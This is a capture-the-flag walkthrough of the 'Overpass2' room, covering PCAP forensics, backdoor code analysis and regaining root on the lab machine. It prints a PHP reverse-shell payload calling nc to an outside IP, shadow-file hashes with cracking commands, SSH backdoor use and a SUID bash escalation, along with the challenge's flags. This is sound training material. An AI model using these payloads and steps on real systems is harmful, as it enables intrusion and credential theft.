```
Target Name: Overpass2
```

```
Task 1: Forensics - Analyse the PCAP
```

```
Task 1.1: What was the URL of the page they used to upload a reverse shell? => /development/
```
1. To solve this let's download the pcap file and investigate the packets captured by the team.
2. On investigating a GET request we can see that a /development/ hosts an upload form where a file could be uploaded.
3. There is a POST request to /development/upload.php where we can see that a shell file was uploaded with the name payload.php.

```
Task 1.2: What payload did the attacker use to gain access? => <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
1. So it is easy to check the POST request going to /development/upload.php.
2. Right-click on the POST request log and select follow => HTTP Stream.
3. The payload is mentioned there as value to the *Payload.php*

```
Task 1.3: What password did the attacker use to privesc? => whenevernoteartinstant
```
1. Further investigating the TCP packets by using follow => TCP Stream we come to know that attacker executed a *ls -al* command and found a file with name *.overpass* in `/var/www/html/development/uploads`
2. Next the attacker accessed the file using the cat command and the file carried the password for the user James.
3. The password was *whenevernoteartinstant*
4. Next using the password the attacker executed a command *sudo -l*

```
Task 1.4: How did the attacker establish persistence? => https://github.com/NinjaJc01/ssh-backdoor
```
1. Still following the TCP packets we came across that user executed a cat command on */etc/shadow*
2. The attacker found the following users' passwords for which could be Brute Forced.
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
``` 
3. Next the attacker executed *git clone https://github.com/NinjaJc01/ssh-backdoor* to establish persistence

```
Task 1.5: Using the *fasttrack* wordlist, how many of the system passwords were crackable? =>
```

1. To do this let's download the *fasttrack* wordlist from `https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt`
2. Next we will save the users hash found in `/etc/shadow` file and use John the ripper to get the plain text password of the users.
3. The passwords were easy to crack and we could crack *4* out of *5* user's passwords.
```
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secuirty3        (paradox)
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
4g 0:00:00:00 DONE (2021-12-21 00:12) 4.444g/s 246.6p/s 1128c/s 1128C/s admin..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
Task 2:  Research - Analyse the code
```

```
Task 2.1: What's the default hash for the backdoor? => bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```
1. check the main.go file from the ss-backdoor git repo we downloaded earlier the hash is mentioned in it.

```
Task 2.2: What's the hardcoded salt for the backdoor? => 1c362db832f3f864c8c2fe05f2002a05
```
1. In the ssh-backdoor repo the main.go file holds the salt, it can be found defined in *passwordHandler* function.

```
Task 2.3: What was the hash that the attacker used? - go back to the PCAP for this! => 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
1. Repoen the pcapng file with wireshark and lets start looking at the TCP Stream again.
2. The attacker has cloned the ssh-backdoor repo and generated a new ssh key pair using *ssh-gen* command.
3. Next the attacker has provided executing permission to the backdoor script using chmod +x backdoor.
4. Now the attacker execute's `./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed` to get a persistance connection on port 2222 via ssh.

```
Task 2.4: Crack the hash using RockYou and a cracking tool of your choice. What's the password? => november16
```
1. For this we will be using hachcat but first, we need to understand the type of hash we are dealing with.
2. So going back to the main.go file we can see that a SHA512 hash is generated using a salt value *Check below code the hashPassword function returns a hash value that is sha512*
```
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
```
3. So let's navigate to `https://hashcat.net/wiki/doku.php?id=example_hashes` and check what mode we can use to crack the sha512 hash that has a salt value as well.
4. So we conclude we will be using mode 1710 as it best fits our requirments `1710 	sha512($pass.$salt) 	e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd:6352283260`
5. let's save the hash and salt in a file called hash and pass it to the hashcat file to crat it.
6. The formate of hash and salt should be hash:salt in the file the *:* being the seprator between both the vaules, following being the final formate
`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05`
7. Fire this command and wait for hashcat to crack the hash `hashcat -m 1710 hash /usr/share/wordlists/rockyou.txt --force`
8. Hashcat gives us the password `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16` where `november16` being the password. So now we have the password of the attacker.

```
Task 3: Attack - Get back in!
```

```
Task 3.1: The attacker defaced the website. What message did they leave as a heading? => H4ck3d by CooctusClan
```
1. Deploy the machine and navigate the website.
2. We see a message saying *H4ck3d by CooctusClan*

```
Task 3.2: Using the information you've found previously, hack your way back in!
```
1. So we know the password used by the attacker *november16* we know the username *James* and we know the attacker is using port *2222* as SSH service as the ssh-backdoor tool uses that port.
2. So let's connect to the server via ssh -p 2222 james@<ip address> pass the password and we are in.

```
Task 3.3: What's the user flag? => thm{d119b4fa8c497ddb0525f7ad200e6567}
```
1. As we have an ssh connection to the server let's navigate to */home/james* and execute ls -al
2. We have the user.txt file in the directory let's cat it and get the flag.

```
Task 3.4: What's the root flag? => thm{d53b2684f169360bb9606c333873144d}
```
1. We currently are not a root user we will need to enumerate more to escalate to root privileges.
2. Notice under */home/james* there is a file named `.suid_bash` it is shown that it is owned by *root* and we can execute it as we have the right permissions to do so `-rwsr-sr-x`
3. On further investigating the binary we come to know that it is a file that can run bash as *root* user it is in general a suid misconfiguration where a normal user can execute the binary with root privileges in our case it gives us access to bash as the root user.
4. So if you just execute the `.suid_bash` file you will have a bash shell but not as a root user.
5. The GTFO bins have a great way to exploit it and escalate our shell to *root* check `https://gtfobins.github.io/gtfobins/bash/` all we need to do is execute the `suid_bash` with a -p and get a root shell.
6. So let's execute ./suid_bash -p and bingo we have root navigate to /root and cat root.txt to grab the root flag and complete the challange.
